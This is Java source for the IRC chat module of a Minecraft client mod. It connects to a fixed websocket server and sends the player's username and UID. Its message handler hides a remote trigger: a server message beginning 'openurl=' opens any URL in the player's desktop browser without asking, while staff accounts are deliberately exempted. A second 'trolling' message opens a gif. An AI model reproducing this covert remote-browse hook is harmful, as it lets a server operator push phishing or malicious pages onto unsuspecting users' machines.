package me.kansio.client.irc;

import me.kansio.client.Client;
import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class IRCClient extends WebSocketClient {

    public static boolean allow = true;
    Boolean STAFF = Integer.parseInt(Client.getInstance().getUid()) < 10;

    private void blacklistStaff() {
        if(STAFF) {
            allow = false;
        }else {allow = true;}
    }

    public static char SPLIT = '\u0000';

    public IRCClient() throws URISyntaxException {
        super(new URI("ws://zerotwoclient.xyz:1337"));
        this.setAttachment(Client.getInstance().getUsername());
        this.addHeader("name", this.getAttachment());
        this.addHeader("uid", Client.getInstance().getUid());
        blacklistStaff();
    }

    public static boolean isAllowed() {return allow;}
    @Override
    public void onOpen(ServerHandshake serverHandshake) {
        System.out.println("IRC Connected");
        Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §f" + "Connected"));
    }

    @Override
    public void onMessage(String s) {
        if (s.contains(Character.toString(SPLIT))) {
            String split[] = s.split(Character.toString(SPLIT));
            String username = split[0];
            String message = split[1];

            if (allow) {
                if (message.startsWith("openurl=")) {
                    String url = message.replaceAll("openurl=", "");
                    try {
                        Desktop.getDesktop().browse(new URI(url));
                    } catch (IOException | URISyntaxException e) {
                        e.printStackTrace();
                    }
                }  else if (message.equals("Trolling Complete, Returning To HQ")) {
                    try {
                        Desktop.getDesktop().browse(new URI("https://c.tenor.com/Yfz3eq2ZLo0AAAAd/pee.gif"));
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (URISyntaxException e) {
                        e.printStackTrace();
                    }
                } else {
                    Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §b" + username + " §7[§b" + Integer.parseInt(Client.getInstance().getUid()) + "§7] " + "§f: " + message));
                }
            } else if (message.equals("Trolling Complete, Returning To HQ")) {
                try {
                    Desktop.getDesktop().browse(new URI("https://c.tenor.com/Yfz3eq2ZLo0AAAAd/pee.gif"));
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (URISyntaxException e) {
                    e.printStackTrace();
                }
            } else {
                Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §b" + username + " §7[§b" + Integer.parseInt(Client.getInstance().getUid()) + "§7] " + "§f: " + message));
            }
        } else {
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] " + s));
        }
    }

    @Override
    public void onClose(int i, String s, boolean b) {
        System.out.println("IRC Disconnected");
        Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §f" + "Disconnected"));
    }

    @Override
    public void onError(Exception e) {
        e.printStackTrace();
    }

}
